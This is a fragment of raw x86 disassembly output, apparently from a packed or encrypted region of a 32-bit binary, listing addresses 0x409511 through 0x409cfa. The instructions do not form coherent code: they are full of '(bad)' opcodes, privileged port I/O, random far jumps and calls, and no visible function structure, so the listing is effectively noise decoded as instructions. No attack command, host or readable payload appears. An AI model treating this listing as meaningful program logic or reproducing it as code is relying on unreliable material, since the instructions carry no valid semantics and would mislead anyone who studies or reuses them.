  409511:	mov    DWORD PTR [edx],esi
  409513:	xchg   esp,eax
  409514:	jg     0x4094bf
  409516:	fisttp WORD PTR [ebp-0x138860f2]
  40951c:	add    al,0x57
  40951e:	icebp  
  40951f:	lods   al,BYTE PTR ds:[esi]
  409520:	fild   WORD PTR [edi]
  409522:	ret    
  409523:	test   ebp,ebp
  409525:	retf   0x15b6
  409528:	sub    dh,BYTE PTR [ecx]
  40952a:	and    ebp,edx
  40952c:	sub    DWORD PTR [edx+ebx*1-0x20],eax
  409530:	sub    eax,0xea18a45f
  409535:	push   0x6b4380b0
  40953a:	jmp    0x34233744
  40953f:	xor    al,0xf3
  409541:	outs   dx,BYTE PTR ds:[esi]
  409542:	mov    dl,0xf1
  409544:	add    cl,BYTE PTR [edx-0x621b3f4d]
  40954a:	xchg   DWORD PTR gs:[esi],ebp
  40954d:	xchg   ebp,eax
  40954e:	cmp    eax,0x582e1e6c
  409553:	lock in al,dx
  409555:	dec    eax
  409556:	neg    DWORD PTR [edi-0x321fb867]
  40955c:	stos   DWORD PTR es:[edi],eax
  40955d:	cwde   
  40955e:	test   dl,bl
  409560:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409561:	adc    eax,0xbed5c8cf
  409566:	jo     0x4095dc
  409568:	rcl    BYTE PTR [esi],cl
  40956a:	or     ebx,DWORD PTR [edx-0x4b]
  40956d:	aas    
  40956e:	sbb    eax,0x584412b1
  409573:	jae    0x40959d
  409575:	jge    0x4095cc
  409577:	jl     0x40954c
  409579:	loopne 0x409593
  40957b:	jp     0x4095ae
  40957d:	popa   
  40957e:	and    BYTE PTR [ebx+0x42d1fa9f],ch
  409584:	and    al,0x2d
  409586:	mov    esp,0xa44f4740
  40958b:	dec    esi
  40958c:	ja     0x409607
  40958e:	mov    ch,BYTE PTR [esi-0x1ab0e50e]
  409594:	into   
  409595:	fdivr  QWORD PTR [ecx]
  409597:	jns    0x409520
  409599:	or     ah,bl
  40959b:	les    edx,FWORD PTR gs:[eax-0x4cf3eccf]
  4095a2:	sub    eax,0xc62253e9
  4095a7:	mov    al,0xf0
  4095a9:	inc    eax
  4095aa:	or     al,0xf7
  4095ac:	mov    ds:0x3c4faeb3,eax
  4095b1:	add    cl,bh
  4095b3:	jne    0x40956e
  4095b5:	imul   esp,ebp,0xab6fcedb
  4095bb:	jne    0x40962e
  4095bd:	mov    di,WORD PTR [esi+0x63a37b2e]
  4095c4:	std    
  4095c5:	or     DWORD PTR [eax-0x64],0x6617d2d4
  4095cc:	dec    ecx
  4095cd:	sbb    cl,al
  4095cf:	(bad)  
  4095d0:	das    
  4095d1:	sbb    eax,0x1ebdeab7
  4095d6:	scas   al,BYTE PTR es:[edi]
  4095d7:	adc    eax,edi
  4095d9:	pushf  
  4095da:	pushf  
  4095db:	in     al,0x19
  4095dd:	(bad)  
  4095df:	pop    es
  4095e0:	ret    0x9caa
  4095e3:	retf   0x35e4
  4095e6:	push   ebx
  4095e7:	hlt    
  4095e8:	adc    DWORD PTR [edx-0x70],edi
  4095eb:	int    0xec
  4095ed:	xchg   BYTE PTR [esi-0x501341ed],bl
  4095f3:	fld    DWORD PTR [ebx-0x7c796f2d]
  4095f9:	in     eax,dx
  4095fa:	add    al,bh
  4095fc:	sbb    al,0x50
  4095fe:	inc    edi
  4095ff:	js     0x409596
  409601:	sbb    ecx,ebx
  409603:	xor    ebx,DWORD PTR [ecx]
  409605:	xchg   edx,eax
  409606:	sar    BYTE PTR [ebp-0x7eb0cd9e],1
  40960c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40960d:	inc    edx
  40960e:	sub    DWORD PTR [edx+0x6],0xb911c380
  409615:	sbb    dl,al
  409617:	es gs ret 0xf217
  40961c:	bound  esi,QWORD PTR [edi]
  40961e:	mov    bh,0x50
  409620:	in     eax,0x48
  409622:	and    al,0x6c
  409624:	push   edi
  409625:	cmovno esi,edi
  409628:	fmul   st(4),st
  40962a:	cld    
  40962b:	jle    0x40964b
  40962d:	add    BYTE PTR [edx+0x10a0e13c],ah
  409633:	int3   
  409634:	mov    dh,0x45
  409636:	imul   esp,esi,0xfffffff6
  409639:	sub    edx,esi
  40963b:	pop    ds
  40963c:	xchg   BYTE PTR [esi+0x2bee9e0],dl
  409642:	retf   
  409643:	push   eax
  409644:	dec    ebx
  409645:	ret    
  409646:	mov    bl,0x89
  409648:	lods   al,BYTE PTR ds:[esi]
  409649:	cmp    DWORD PTR [edx-0x4c],0x6138c6a4
  409650:	jns    0x4096b2
  409652:	shl    BYTE PTR [eax+ecx*1-0x2b],cl
  409656:	call   0x4b67:0x84c2783f
  40965d:	jle    0x40960f
  40965f:	mov    cl,0x86
  409661:	add    DWORD PTR [esp+0x24],eax
  409665:	mov    esi,0x721a8be5
  40966a:	push   ecx
  40966b:	mov    bl,BYTE PTR [eax+0x7ad12b44]
  409671:	cs in  eax,0xf6
  409674:	pop    ecx
  409675:	dec    ebx
  409676:	je     0x409619
  409678:	xor    eax,0x610bbbf9
  40967d:	data16 sbb al,0xb8
  409680:	add    eax,DWORD PTR [edx+0xa83c6c2]
  409686:	add    edi,DWORD PTR [ebp+eax*2-0x243034b4]
  40968d:	nop
  40968e:	pop    esp
  40968f:	mov    ds:0x4cc41b82,eax
  409694:	mov    cs,WORD PTR [ebx-0x44846324]
  40969a:	add    eax,0xabd92f16
  40969f:	jb     0x409664
  4096a1:	add    al,0xd6
  4096a3:	push   eax
  4096a4:	jge    0x4096ba
  4096a6:	push   ebp
  4096a7:	stc    
  4096a8:	dec    edx
  4096a9:	lds    esi,FWORD PTR [ecx]
  4096ab:	mov    ch,0xec
  4096ad:	add    edi,edi
  4096af:	or     al,0xd9
  4096b1:	xchg   ebx,eax
  4096b2:	outs   dx,BYTE PTR ds:[esi]
  4096b3:	xor    al,0x8a
  4096b5:	jne    0x40971f
  4096b7:	ss dec edx
  4096b9:	adc    BYTE PTR [eax],dh
  4096bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096bc:	fwait
  4096bd:	and    BYTE PTR [ecx-0xc],dl
  4096c0:	xor    eax,eax
  4096c2:	jmp    0x2d50:0x914fe39
  4096c9:	data16 das 
  4096cb:	out    dx,eax
  4096cc:	push   edx
  4096cd:	sub    bh,BYTE PTR [ecx+0x175eb4ff]
  4096d3:	ret    
  4096d4:	sbb    ebp,DWORD PTR [esi-0x7d]
  4096d7:	jmp    0xc68c6c63
  4096dc:	jns    0x409707
  4096de:	jecxz  0x409758
  4096e0:	test   eax,0xb80639f7
  4096e5:	in     al,dx
  4096e6:	jns    0x4096f6
  4096e8:	pop    ds
  4096e9:	push   ebp
  4096ea:	ror    DWORD PTR [ecx+0x2eaf7172],cl
  4096f0:	pop    ds
  4096f1:	inc    DWORD PTR [ebx+edx*2-0x4c]
  4096f5:	mov    bl,BYTE PTR [esi+0x115a0f60]
  4096fb:	lea    esp,[ecx-0x6f]
  4096fe:	sti    
  4096ff:	inc    ebx
  409700:	cli    
  409701:	int    0x83
  409703:	aad    0x9f
  409705:	jns    0x409688
  409707:	pop    edx
  409708:	retf   
  409709:	pop    esp
  40970a:	jge    0x409785
  40970c:	adc    BYTE PTR ds:0x4ca075ca,dh
  409712:	jl     0x409709
  409714:	addr16 push ds
  409716:	or     al,BYTE PTR [ebx-0x50]
  409719:	cmc    
  40971a:	(bad)
  40971d:	pop    ebp
  40971e:	sar    BYTE PTR [eax+0x5ef760b],cl
  409724:	loop   0x40976e
  409726:	pop    ss
  409727:	pop    edx
  409728:	add    eax,0x916b8f4c
  40972d:	jnp    0x40974a
  40972f:	sbb    DWORD PTR [ebp+ebp*2+0x2d27e9e6],esp
  409736:	icebp  
  409737:	xchg   edi,eax
  409738:	js     0x409738
  40973a:	call   0xdcaa:0xa1941550
  409741:	push   es
  409742:	retf   0x9d59
  409745:	adc    DWORD PTR [ecx+edx*1+0x2a0a3938],ebp
  40974c:	nop
  40974d:	(bad)  
  40974e:	push   ecx
  40974f:	mov    bh,0xd7
  409751:	rol    DWORD PTR [ecx-0x78e60fa5],cl
  409757:	add    cl,BYTE PTR cs:[eax]
  40975a:	and    al,0xd9
  40975c:	mov    bh,0xda
  40975e:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  409760:	add    ch,al
  409762:	aas    
  409763:	lods   eax,DWORD PTR ds:[esi]
  409764:	dec    edx
  409765:	repnz xor DWORD PTR [eax+0x7d],0xffffff85
  40976a:	jle    0x40973d
  40976c:	jns    0x40975e
  40976e:	cld    
  40976f:	arpl   WORD PTR [edx-0x11a339a3],bp
  409775:	jb     0x4097ee
  409777:	sbb    DWORD PTR [ebx+0x68ad0467],ebx
  40977d:	mov    bl,BYTE PTR [ebx-0x4c187045]
  409783:	rcr    dh,0xa5
  409786:	xor    eax,DWORD PTR [ecx+0x77]
  409789:	enter  0xf9f,0x87
  40978d:	xchg   edi,eax
  40978e:	adc    esi,ebp
  409790:	sti    
  409791:	ins    BYTE PTR es:[edi],dx
  409792:	mov    ah,0xfe
  409794:	(bad)  
  409795:	push   ecx
  409796:	retf   0xa537
  409799:	shl    BYTE PTR [ebp-0x54],1
  40979c:	adc    eax,0xfffe9f37
  4097a1:	fistp  DWORD PTR [ecx-0x64]
  4097a4:	dec    ecx
  4097a5:	lods   eax,DWORD PTR ds:[esi]
  4097a6:	(bad)  
  4097a7:	mov    bl,0xb1
  4097a9:	lock mov ds:0xbb10ff0a,eax
  4097af:	push   cs
  4097b0:	inc    edi
  4097b1:	jmp    0xb31fee14
  4097b6:	out    dx,eax
  4097b7:	mov    dh,0x59
  4097b9:	outs   dx,BYTE PTR ds:[esi]
  4097ba:	jl     0x4097bd
  4097bc:	push   edi
  4097bd:	xchg   ebp,eax
  4097be:	ins    DWORD PTR es:[edi],dx
  4097bf:	or     DWORD PTR [ebx],0xb876508c
  4097c5:	int3   
  4097c6:	dec    ebp
  4097c7:	js     0x409817
  4097c9:	add    edi,DWORD PTR [ecx-0x19]
  4097cc:	or     esi,edi
  4097ce:	mov    dl,0x1c
  4097d0:	lea    eax,[edi]
  4097d2:	push   ss
  4097d3:	mov    dh,0xf1
  4097d5:	mov    ds:0x78138d9a,al
  4097da:	dec    edi
  4097db:	shl    DWORD PTR [esi+0x38ac444f],1
  4097e1:	cmp    ecx,eax
  4097e3:	cmp    ecx,0x56
  4097e6:	pop    eax
  4097e7:	add    edx,esi
  4097e9:	aad    0x2b
  4097eb:	cwde   
  4097ec:	cs out 0x86,al
  4097ef:	push   ds
  4097f0:	and    edx,DWORD PTR [edi+0x45adc29d]
  4097f6:	icebp  
  4097f7:	jp     0x40985e
  4097f9:	mov    edx,0x9624585f
  4097fe:	lds    edi,FWORD PTR [edx+0x7ce988fd]
  409804:	loop   0x4097e5
  409806:	shr    esp,0x7
  409809:	pop    eax
  40980a:	in     al,dx
  40980b:	inc    esp
  40980c:	cli    
  40980d:	adc    BYTE PTR [ebx],bh
  40980f:	ror    edx,0xf6
  409812:	std    
  409813:	mov    esp,0xdf62911c
  409818:	jne    0x409892
  40981a:	jno    0x4097fa
  40981c:	push   0xffffffb5
  40981e:	jne    0x4097c6
  409820:	scas   al,BYTE PTR es:[edi]
  409821:	loopne 0x409849
  409823:	ficom  WORD PTR [ecx+eax*2]
  409826:	(bad)  
  409827:	mov    edx,0xc10b304f
  40982c:	retf   0x1007
  40982f:	ss loopne 0x4098b1
  409832:	push   edi
  409833:	cmove  eax,ebx
  409836:	out    dx,al
  409837:	sahf   
  409838:	ja     0x4097eb
  40983a:	shr    BYTE PTR [edx],cl
  40983c:	adc    edx,esp
  40983e:	lods   eax,DWORD PTR ds:[esi]
  40983f:	pop    ecx
  409840:	fnstcw WORD PTR [edx+0x18]
  409843:	mov    ebx,0xf50fa3b0
  409848:	xor    DWORD PTR [edx-0x4d],0xbc9ac8f7
  40984f:	xor    edx,ebp
  409851:	jge    0x409837
  409853:	mov    ecx,0x9ec17abf
  409858:	xchg   ecx,eax
  409859:	mov    esp,0xe5a98706
  40985e:	cld    
  40985f:	sbb    DWORD PTR [edx],ecx
  409861:	ror    DWORD PTR [ecx+edi*4],0x7a
  409865:	adc    esi,eax
  409867:	outs   dx,DWORD PTR ds:[esi]
  409868:	shl    BYTE PTR [edi-0x410c0d1e],cl
  40986e:	mov    edx,0xd8ec6187
  409873:	and    edi,DWORD PTR [edi]
  409875:	inc    edi
  409876:	pop    esp
  409877:	mov    cl,0xf4
  409879:	test   al,0x2c
  40987b:	cmp    ah,0xed
  40987e:	arpl   WORD PTR [ebp-0x2835f1fd],bx
  409884:	(bad)  
  409885:	in     al,dx
  409886:	sbb    ecx,DWORD PTR [edi+edx*1-0x4d4f6936]
  40988d:	imul   eax,DWORD PTR [esi+0xd07b8cc],0xffffff90
  409894:	push   0xbce7f9
  409899:	and    al,0xfa
  40989b:	push   es
  40989c:	stos   DWORD PTR es:[edi],eax
  40989d:	mov    al,ds:0x2473b5d8
  4098a2:	adc    eax,0xf3b69208
  4098a7:	repnz popfw 
  4098aa:	fild   DWORD PTR [eax]
  4098ac:	cli    
  4098ad:	jl     0x40983e
  4098af:	fsubr  DWORD PTR [ecx-0x34]
  4098b2:	push   edx
  4098b3:	int    0x41
  4098b5:	cdq    
  4098b6:	add    BYTE PTR [esp+esi*8],0xba
  4098ba:	cwde   
  4098bb:	lock (bad) 
  4098be:	xchg   ecx,eax
  4098bf:	cli    
  4098c0:	xor    esp,DWORD PTR [ebx+eax*2+0x59]
  4098c4:	dec    ebx
  4098c5:	inc    esi
  4098c6:	pop    ds
  4098c7:	xchg   edi,eax
  4098c8:	ror    DWORD PTR [edx+ebp*2+0x667319cd],cl
  4098cf:	popa   
  4098d0:	jb     0x4098cc
  4098d2:	mov    al,ds:0x9e2bdddc
  4098d7:	mov    edi,0xb9bb5bcf
  4098dc:	hlt    
  4098dd:	stos   DWORD PTR es:[edi],eax
  4098de:	adc    BYTE PTR es:[edx],ch
  4098e1:	js     0x4098e4
  4098e3:	pop    esi
  4098e4:	and    bl,ch
  4098e6:	lods   al,BYTE PTR ds:[esi]
  4098e7:	sub    ecx,DWORD PTR [ebx+0x17]
  4098ea:	mov    edi,0xaff2be25
  4098ef:	das    
  4098f0:	iret   
  4098f1:	aas    
  4098f2:	out    0x44,al
  4098f4:	test   DWORD PTR [edi],ebx
  4098f6:	cmp    ah,ah
  4098f8:	fst    DWORD PTR [edi+eax*4+0x32864a2a]
  4098ff:	dec    ebx
  409900:	push   esi
  409901:	pop    ecx
  409902:	jge    0x409962
  409904:	adc    al,0xd0
  409906:	or     DWORD PTR [ebp-0x7a],eax
  409909:	retf   0xc57c
  40990c:	sbb    al,0x4e
  40990e:	sahf   
  40990f:	mov    eax,0xa7a86345
  409914:	fsubr  st,st(7)
  409916:	retf   
  409917:	lods   al,BYTE PTR ds:[esi]
  409918:	gs mov bl,0x39
  40991b:	sti    
  40991c:	out    0x9d,al
  40991e:	sbb    BYTE PTR [ecx],dl
  409920:	lea    edx,[ebx-0x47ff4143]
  409926:	lds    ecx,FWORD PTR [esp+eax*8]
  409929:	lds    esi,FWORD PTR [edx]
  40992b:	les    ebx,FWORD PTR [ebp+esi*2+0xe]
  40992f:	push   edi
  409930:	loope  0x409980
  409932:	xchg   DWORD PTR [edx-0x19],edi
  409935:	jns    0x409923
  409937:	gs iret 
  409939:	jecxz  0x4099aa
  40993b:	rcr    DWORD PTR [eax+0x6c],1
  40993e:	enter  0x9b81,0x9f
  409942:	xor    dh,BYTE PTR [esi]
  409944:	aad    0x4d
  409946:	imul   ebx,ebp,0xffffffce
  409949:	sub    al,0xaf
  40994b:	mov    esi,DWORD PTR [edx+ecx*4]
  40994e:	xlat   BYTE PTR ds:[ebx]
  40994f:	outs   dx,DWORD PTR ds:[esi]
  409950:	fcomp  DWORD PTR [ebp-0x7d]
  409953:	inc    edx
  409954:	lods   eax,DWORD PTR ds:[esi]
  409955:	push   eax
  409956:	and    al,0x2b
  409958:	fs xchg edi,eax
  40995a:	popa   
  40995b:	or     ah,BYTE PTR [eax]
  40995d:	push   ebp
  40995e:	sbb    eax,0x4ea6feee
  409963:	lods   eax,DWORD PTR ds:[esi]
  409964:	loopne 0x40997d
  409966:	(bad)  
  409967:	xchg   edi,eax
  409968:	retf   
  409969:	popf   
  40996a:	xchg   ebp,eax
  40996b:	(bad)  
  40996c:	jecxz  0x4099c0
  40996e:	inc    esi
  40996f:	les    sp,DWORD PTR [ecx+0x6f30e126]
  409976:	mov    cl,0x42
  409978:	loope  0x409963
  40997a:	sbb    BYTE PTR [eax-0x1df220e6],ch
  409980:	cdq    
  409981:	stos   DWORD PTR es:[edi],eax
  409982:	jb     0x40991a
  409984:	adc    edx,DWORD PTR [ebp+eax*8-0x6d3a3a4e]
  40998b:	in     eax,0x19
  40998d:	and    DWORD PTR [edi-0x6b80e9db],edx
  409993:	jne    0x40994a
  409995:	shr    BYTE PTR [ebx+edi*8+0x6b],cl
  409999:	cdq    
  40999a:	cmp    cl,BYTE PTR [edx]
  40999c:	mov    esi,0xabe88dae
  4099a1:	mov    eax,0x66f76984
  4099a6:	call   0x4afe:0x9294a111
  4099ad:	loope  0x4099c0
  4099af:	inc    eax
  4099b0:	mov    ebp,0xcb14506c
  4099b5:	test   BYTE PTR [ebx],ch
  4099b7:	out    0x72,eax
  4099b9:	dec    edx
  4099ba:	xchg   ecx,eax
  4099bb:	ja     0x409951
  4099bd:	jnp    0x4099bd
  4099bf:	xchg   esp,eax
  4099c0:	adc    eax,0xf7865e01
  4099c5:	leave  
  4099c6:	push   0x20
  4099c8:	popa   
  4099c9:	cld    
  4099ca:	mov    esi,0x7968656a
  4099cf:	stos   BYTE PTR es:[edi],al
  4099d0:	test   edx,edi
  4099d2:	sbb    eax,0xad270891
  4099d7:	xchg   esi,eax
  4099d8:	int    0xb5
  4099da:	aas    
  4099db:	je     0x409974
  4099dd:	add    BYTE PTR [esi+eiz*4+0xe75b57b],cl
  4099e4:	cmp    eax,0xd59b2ab8
  4099e9:	ficomp WORD PTR [ecx-0x33]
  4099ec:	jle    0x4099fb
  4099ee:	add    eax,0x4f7a505c
  4099f3:	fwait
  4099f4:	lods   al,BYTE PTR ds:[esi]
  4099f5:	imul   edi,DWORD PTR [eax-0x48],0x72
  4099f9:	jb     0x409a6f
  4099fb:	dec    edi
  4099fc:	ja     0x4099cf
  4099fe:	jg     0x4099fc
  409a00:	cmc    
  409a01:	dec    edi
  409a02:	pop    es
  409a03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a04:	xor    al,0x1d
  409a06:	aam    0xdd
  409a08:	test   eax,0x8f6c237a
  409a0d:	aas    
  409a0e:	push   edi
  409a0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a10:	pushf  
  409a11:	test   eax,0xbe35df33
  409a16:	in     al,0x56
  409a18:	repz mov cl,0x3
  409a1b:	xchg   BYTE PTR [eax],al
  409a1d:	int3   
  409a1e:	adc    BYTE PTR [edx+0x6a],dh
  409a21:	inc    ecx
  409a22:	(bad)  
  409a23:	daa    
  409a24:	jmp    0xf0c8473b
  409a29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a2a:	rol    DWORD PTR [esi-0xd],0x2b
  409a2e:	in     eax,dx
  409a2f:	add    esi,0xffffffba
  409a32:	gs jmp 0x41215cd3
  409a38:	sub    bl,dl
  409a3a:	mov    bh,BYTE PTR [edi]
  409a3c:	push   edx
  409a3d:	outs   dx,DWORD PTR ds:[esi]
  409a3e:	popa   
  409a3f:	out    0xdb,eax
  409a41:	inc    ebx
  409a42:	jecxz  0x409a02
  409a44:	mov    ebp,0x887bd871
  409a49:	jae    0x409a9a
  409a4b:	inc    ecx
  409a4c:	and    eax,0xb720b7de
  409a51:	cld    
  409a52:	xor    DWORD PTR [ebp-0x7],edx
  409a55:	mov    cs,WORD PTR [edi-0x72]
  409a58:	mov    ah,0x8a
  409a5a:	lods   eax,DWORD PTR ds:[esi]
  409a5b:	sbb    cl,ch
  409a5d:	mov    ds:0xc083c7ea,eax
  409a62:	in     al,0x12
  409a64:	fs mov al,0x15
  409a67:	and    ebp,DWORD PTR [ebx-0x5c]
  409a6a:	jmp    0x9cd7:0xad9a15a
  409a71:	repnz add esp,DWORD PTR [edi+0x3fb2958f]
  409a78:	int3   
  409a79:	sbb    DWORD PTR [esi+0x5e],0x16
  409a7d:	div    BYTE PTR [edx-0x4437e369]
  409a83:	xor    esi,DWORD PTR [esi]
  409a85:	ret    
  409a86:	daa    
  409a87:	xchg   DWORD PTR [edx+0x50a5dd70],ebx
  409a8d:	mov    ds:0x5be023e0,al
  409a92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a93:	scas   eax,DWORD PTR es:[edi]
  409a94:	mov    ss,ebx
  409a96:	test   dh,al
  409a98:	scas   al,BYTE PTR es:[edi]
  409a99:	inc    edi
  409a9a:	cmp    esi,DWORD PTR [ebp+0x51540f35]
  409aa0:	xchg   ebx,eax
  409aa1:	rcl    BYTE PTR [ebx+edi*4-0x54614a39],cl
  409aa8:	icebp  
  409aa9:	ret    0x6448
  409aac:	in     al,0x39
  409aae:	mov    esi,0x70dc0d3e
  409ab3:	or     al,0x38
  409ab5:	aas    
  409ab6:	xchg   ch,cl
  409ab8:	fs scas al,BYTE PTR es:[edi]
  409aba:	lods   eax,DWORD PTR ds:[esi]
  409abb:	lea    eax,[ecx-0x1d333127]
  409ac1:	pop    ebp
  409ac2:	xor    DWORD PTR [edx-0x32],0x4fe3f5c1
  409ac9:	imul   edx,edx,0x3833e5d4
  409acf:	loop   0x409a87
  409ad1:	jl     0x409b32
  409ad3:	shr    ah,1
  409ad5:	imul   ebp,esi,0x3869872b
  409adb:	xor    al,0xaa
  409add:	(bad)  
  409ade:	fdivr  st(5),st
  409ae0:	je     0x409b54
  409ae2:	mov    al,ds:0xb90a7133
  409ae7:	pop    edi
  409ae8:	outs   dx,BYTE PTR ds:[esi]
  409ae9:	and    al,0xc7
  409aec:	xor    BYTE PTR [ebx],ah
  409aee:	std    
  409aef:	lea    esi,[edi]
  409af1:	push   cs
  409af2:	adc    DWORD PTR [ecx+0x5f],ecx
  409af5:	add    al,0x98
  409af7:	test   eax,0x26597651
  409afc:	call   0x52caa654
  409b01:	gs (bad) 
  409b03:	sbb    bh,BYTE PTR [edx+0x5e]
  409b06:	outs   dx,BYTE PTR ds:[esi]
  409b07:	adc    eax,0xb355230a
  409b0c:	in     eax,0xe2
  409b0e:	lea    esi,[edx+0x447f24e0]
  409b14:	(bad)  
  409b15:	imul   ebp,DWORD PTR [eax-0x6c],0x48
  409b19:	mov    ds:0x6f4836d,al
  409b1e:	ja     0x409aeb
  409b20:	xchg   esp,eax
  409b21:	(bad)  
  409b22:	mov    ds:0xc7abf8bd,al
  409b27:	mov    esi,0x528631a5
  409b2c:	(bad)
  409b31:	lea    edx,[edi+edi*4+0x441d422c]
  409b38:	push   cs
  409b39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b3a:	sub    ecx,ebp
  409b3c:	jg     0x409ba2
  409b3e:	dec    ebp
  409b3f:	inc    ecx
  409b40:	fdiv   QWORD PTR [edi*4+0x2ab9ada1]
  409b47:	mov    esi,0x44b9e778
  409b4c:	out    dx,al
  409b4d:	dec    edi
  409b4e:	nop
  409b4f:	jnp    0x409b45
  409b51:	or     ebx,DWORD PTR [ecx]
  409b53:	add    BYTE PTR [ebx+0x3d203893],ah
  409b59:	popf   
  409b5a:	xchg   edi,eax
  409b5b:	sbb    dl,BYTE PTR [edi-0x5b]
  409b5e:	retf   0x83a1
  409b61:	mov    bh,0xb3
  409b63:	lock fldcw WORD PTR [esi+0x7ea7b410]
  409b6a:	fisub  WORD PTR [edi-0x1e]
  409b6d:	add    edi,eax
  409b6f:	loop   0x409bd9
  409b71:	jnp    0x409b45
  409b73:	out    dx,eax
  409b74:	div    DWORD PTR [edi+0x1f]
  409b77:	inc    ebx
  409b78:	mov    ch,0x7b
  409b7a:	out    0x1e,al
  409b7c:	mov    ebp,DWORD PTR [eax]
  409b7e:	lea    esp,[edx+0x790c2a9a]
  409b84:	sbb    BYTE PTR [ebx],bh
  409b86:	sub    al,0x9e
  409b88:	add    BYTE PTR [edx+0x18],dh
  409b8b:	rol    BYTE PTR [eax-0x2b3a6a5b],cl
  409b91:	dec    ebp
  409b92:	and    al,0xda
  409b94:	jl     0x409c05
  409b96:	popa   
  409b97:	or     bl,BYTE PTR [eax-0x2e]
  409b9a:	fstp   TBYTE PTR [edi-0x73]
  409b9d:	jo     0x409bf9
  409b9f:	push   edx
  409ba0:	inc    esi
  409ba1:	les    esi,FWORD PTR [eax+edi*1-0x25]
  409ba5:	jne    0x409c0a
  409ba7:	enter  0x6fc,0x4d
  409bab:	xor    DWORD PTR [eax],0xd4de29a7
  409bb1:	in     eax,dx
  409bb2:	call   0x53e8:0x41c27910
  409bb9:	ret    0x9200
  409bbc:	mov    esi,0xf4ada245
  409bc1:	mov    esi,?
  409bc3:	xor    BYTE PTR [eax+0x5e0060bd],bh
  409bc9:	push   ecx
  409bca:	aam    0x16
  409bcc:	mov    cl,0xaa
  409bce:	call   0x4bde766f
  409bd3:	cmp    eax,0x2c4ba17b
  409bd8:	cmp    bh,BYTE PTR [edi+0x7593490f]
  409bde:	ds inc eax
  409be0:	sbb    al,0x47
  409be2:	push   0xfedb7acd
  409be7:	sub    eax,0xf2f2f13b
  409bec:	pop    ecx
  409bed:	out    dx,eax
  409bee:	(bad)  [ecx+0x74f8a21d]
  409bf4:	xor    eax,0xff4e042c
  409bf9:	inc    edi
  409bfa:	fldenv [ebx]
  409bfc:	push   0x682c85e6
  409c01:	mov    eax,0xed9fc081
  409c06:	mov    esp,0xa0bfc928
  409c0b:	xor    al,0x37
  409c0d:	mov    ebx,0x28fcbac
  409c12:	shl    BYTE PTR [esi],1
  409c14:	adc    DWORD PTR [eax],edx
  409c16:	dec    ecx
  409c17:	push   0x421b2c98
  409c1c:	jmp    0x409c71
  409c1e:	sub    edx,0xffffffe9
  409c21:	dec    esi
  409c22:	add    DWORD PTR [ecx],0xffffffb7
  409c25:	pop    esp
  409c26:	aas    
  409c27:	jge    0x409bca
  409c29:	push   eax
  409c2a:	or     BYTE PTR [esi+0x5b],ch
  409c2d:	and    DWORD PTR [ebx+0x53],ebp
  409c30:	stos   DWORD PTR es:[edi],eax
  409c31:	test   BYTE PTR [ebx],al
  409c33:	cwde   
  409c34:	push   edx
  409c35:	aam    0x12
  409c37:	xlat   BYTE PTR ds:[ebx]
  409c38:	data16 jno 0x409c71
  409c3b:	sahf   
  409c3c:	push   DWORD PTR [ebp-0x46345cb1]
  409c42:	ins    DWORD PTR es:[edi],dx
  409c43:	add    edi,DWORD PTR [esi+ebx*1+0x28f3dd09]
  409c4a:	jle    0x409bd7
  409c4c:	push   0x64
  409c4e:	paddusw mm3,QWORD PTR [ebx]
  409c51:	mov    ah,0x0
  409c53:	mov    ebx,0x8555ebbe
  409c58:	stos   DWORD PTR es:[edi],eax
  409c59:	pxor   mm4,QWORD PTR [ebx]
  409c5c:	xchg   esp,eax
  409c5d:	ss pop edi
  409c5f:	xchg   esp,eax
  409c60:	loop   0x409cb4
  409c62:	nop
  409c63:	fstp   TBYTE PTR [esi+0x2e]
  409c66:	add    esi,ecx
  409c68:	pushw  es
  409c6a:	fwait
  409c6b:	ret    
  409c6c:	loopne 0x409c96
  409c6e:	fstp   TBYTE PTR [eax-0x61fdbd4e]
  409c74:	repz or DWORD PTR [ebp+edi*8+0x12],esi
  409c79:	mov    al,0x25
  409c7b:	imul   esi,DWORD PTR [ebx+eiz*1-0x6fc039bd],0xf20bc63
  409c86:	outs   dx,DWORD PTR ds:[esi]
  409c87:	cld    
  409c88:	sbb    BYTE PTR [edx-0x6c],0xc3
  409c8c:	mov    ebp,DWORD PTR [ebx]
  409c8e:	jne    0x409cf2
  409c90:	adc    eax,0xc5bf5d65
  409c95:	jecxz  0x409c84
  409c97:	xor    DWORD PTR [edi+0x49],0x55
  409c9b:	pop    ss
  409c9c:	mov    DWORD PTR [ecx-0x16],eax
  409c9f:	iret   
  409ca0:	fsub   QWORD PTR [eax-0x2f]
  409ca3:	jge    0x409c2c
  409ca5:	pop    ds
  409ca6:	sbb    BYTE PTR [edi-0x51b3d1d1],0xbf
  409cad:	cmp    DWORD PTR [ecx],esi
  409caf:	push   edi
  409cb0:	mov    dl,0x38
  409cb2:	outs   dx,DWORD PTR ds:[esi]
  409cb3:	xchg   BYTE PTR [ecx],bl
  409cb5:	stos   BYTE PTR es:[edi],al
  409cb6:	push   0xffffffb1
  409cb8:	push   0x76
  409cba:	push   0xffffffb6
  409cbc:	sub    esi,DWORD PTR [ebx]
  409cbe:	aad    0xb3
  409cc0:	xor    ecx,DWORD PTR [esp+esi*4-0x1d]
  409cc4:	push   ds
  409cc5:	cmp    edi,DWORD PTR [edi+eiz*8]
  409cc8:	jne    0x409c79
  409cca:	sbb    edi,DWORD PTR [eax]
  409ccc:	ds dec esp
  409cce:	adc    DWORD PTR [edx+0x12],ecx
  409cd1:	iret   
  409cd2:	stc    
  409cd3:	loop   0x409cef
  409cd5:	loopne 0x409d22
  409cd7:	sahf   
  409cd8:	mov    dh,ch
  409cda:	pop    ecx
  409cdb:	pop    edi
  409cdc:	xchg   ecx,eax
  409cdd:	enter  0x6e5d,0x54
  409ce1:	mov    DWORD PTR [ebx+0x40],0x5c10284e
  409ce8:	mov    edi,0x16e24260
  409ced:	outs   dx,BYTE PTR ds:[esi]
  409cee:	sub    DWORD PTR [eax+0x4],eax
  409cf1:	xor    eax,0x6abb9594
  409cf6:	jb     0x409cbf
  409cf8:	dec    edi
  409cf9:	sahf   
  409cfa:	xchg   ebp,eax
